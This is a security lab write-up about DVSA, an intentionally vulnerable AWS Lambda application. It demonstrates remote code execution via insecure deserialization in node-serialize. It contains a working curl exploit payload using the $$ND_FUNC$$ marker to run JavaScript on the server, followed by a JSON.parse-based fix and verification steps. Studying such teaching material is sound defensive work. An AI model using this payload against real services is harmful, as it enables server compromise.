

# Lesson #9: Vulnerable Dependencies (RCE via Insecure Deserialization)

---

## Overview

This lesson demonstrates a **Remote Code Execution (RCE)** vulnerability caused by a **vulnerable third-party dependency** (`node-serialize`) in a serverless Node.js application.

The issue occurs when attacker-controlled input is deserialized unsafely inside an **AWS Lambda function**, allowing execution of arbitrary JavaScript code.

---

## Vulnerability Summary

* **Type:** Remote Code Execution (RCE)
* **Cause:** Insecure deserialization
* **Component:** AWS Lambda (DVSA-ORDER-MANAGER)
* **Library:** `node-serialize`
* **Impact:** Full backend compromise

---

## Root Cause

The application uses:

```js
serialize.unserialize(event.body)
```

The `node-serialize` library:

* Supports serialized functions
* Executes code marked with `$$ND_FUNC$$`
* Does not validate input

 This allows attackers to inject and execute JavaScript during request processing.

---

## Target Endpoint

```
https://[api-id].execute-api.[region].amazonaws.com/Stage/order
```

---

## Exploit Demonstration

### Attack Request

```bash
curl -X POST "YOUR_API_URL/order" \
-H "Content-Type: application/json" \
-d '{"action":"_$$ND_FUNC$$_function(){ var fs=require(\"fs\"); fs.writeFileSync(\"/tmp/pwned.txt\",\"Lesson9 hacked\"); var d=fs.readFileSync(\"/tmp/pwned.txt\",\"utf-8\"); console.error(\"LESSON9 SUCCESS: \"+d);}()","cart-id":"123"}'
```

---

### Expected Response

```json
{"message":"Internal server error"}
```

⚠️ This error does NOT indicate failure.

---

## Proof of Exploit

Check AWS CloudWatch logs:

```
/aws/lambda/DVSA-ORDER-MANAGER
```

### Evidence:

```
LESSON9 SUCCESS: Lesson9 hacked
```

Confirms:

* Code execution inside Lambda
* File written/read from `/tmp`
* Successful exploitation

---

## Fix Implementation

### Before (Vulnerable)

```js
const serialize = require('node-serialize');

var req = serialize.unserialize(event.body); 
var headers = serialize.unserialize(event.headers);
```

---

### After (Fixed)

```js
// Safe parsing
var req = JSON.parse(event.body || "{}"); 
var headers = event.headers || {};

// Input validation
if (!req.action || typeof req.action !== "string") {
    return callback(null, {
        statusCode: 400,
        body: JSON.stringify({ status: "err", message: "Invalid input" })
    });
}

// Auth check
var auth_header = headers.Authorization || headers.authorization;
if (!auth_header) {
    return callback(null, {
        statusCode: 401,
        body: JSON.stringify({ status: "err", message: "Missing auth" })
    });
}
```

---

##  Verification After Fix

After applying the fix:

* No code execution
* No malicious logs in CloudWatch
* Requests are validated and safely handled

---

##  Security Analysis

### ✔ Intended Behavior

* Input should be treated strictly as data
* No execution of user input

### Exploit Behavior

* Input executed as code via `node-serialize`
* Lambda executed attacker payload

### Fix Outcome

* Input safely parsed using `JSON.parse()`
* Malicious payload no longer executed

---

## Lessons Learned

* Never use unsafe deserialization libraries
* Always treat user input as untrusted
* Validate and sanitize all inputs
* Regularly audit dependencies


---

## Tools Used

* AWS API Gateway
* AWS Lambda
* AWS CloudWatch
* curl
---
## Folder Structure

* `vulnerable-code/`: original vulnerable code
* `fixed-code/`: patched code
* `exploit/`: attack commands
* `screenshots/`: proof of attack and fix
---
## How to Reproduce

1. Deploy DVSA on AWS
2. Locate API Gateway endpoint
3. Run exploit command
4. Check CloudWatch logs
5. Apply fix and test again


